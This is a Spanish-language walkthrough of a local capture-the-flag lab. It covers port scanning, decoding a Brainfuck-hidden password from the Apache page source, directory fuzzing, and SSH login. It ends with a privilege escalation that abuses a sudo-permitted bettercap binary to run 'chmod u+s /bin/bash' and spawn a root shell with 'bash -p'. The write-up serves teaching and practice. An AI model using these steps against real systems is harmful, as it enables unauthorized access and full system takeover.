Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.
```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 172.17.0.2 -oN escaneo
```
![alt text](image.png)

Vemos que nos mustra un servicio apache en el puerto 80. Vamos a ver que nos esconde.
![alt text](image-1.png)

Vemos que nos muestra la página por defecto  de apache. Vamos a analizar el código fuente. Vemso que al final nos muestra el siguiente código.
```
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
```
![alt text](image-4.png)

Vamos a buscar de que trata.
![alt text](image-5.png)

Vemos que trata del lenguaje `Brainfuck`. Vamos a decodificar el mensaje.
![alt text](image-6.png)

Vemos que el mensaje es `bebeaguaqueessano`. Esto es una potencial password.

Ahora vamos a realizar un fuzzing web para ver si hay algun directorio o archivo oculto.
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r --no-error -b 404,403 -x txt,html,php
```
![alt text](image-2.png)

Vemos que hay una ruta llamada `/imagenes`, vamos a ver que nos esconde. 
![alt text](image-3.png)

Vemos que hay una imagen llamada `agua_ssh.jpg`. Puede ser que contenga las credenciales del servicio `ssh`. Así que nos vamos a descargar la imagen para analizarla.

Tras analizarla, vemos que no contiene nada más. Ahora vamos a entrar por ssh.
```
ssh agua@172.17.0.2
password: bebeaguaqueessano
```
![alt text](image-7.png)

Ahora vamos a ver si hay algun binario con permisos de administrador.
```
sudo -l
```
![alt text](image-8.png)

Vamos a ejecutar el binario para ver que hace.
```
sudo /usr/bin/bettrcap
```
![alt text](image-9.png)

Vemos que es como una herramienta interactiva, vamos a ver si corresponde al comando `help`.
![alt text](image-10.png)

Vemos que en la penúltima opción nos permite ejecutar comandos.
```
!chmod u+s /bin/bash
```
![alt text](image-11.png)

Ahora saldremos y nos lanzaremos la shell de administrador.
```
exit

bash -p
```
![alt text](image-12.png)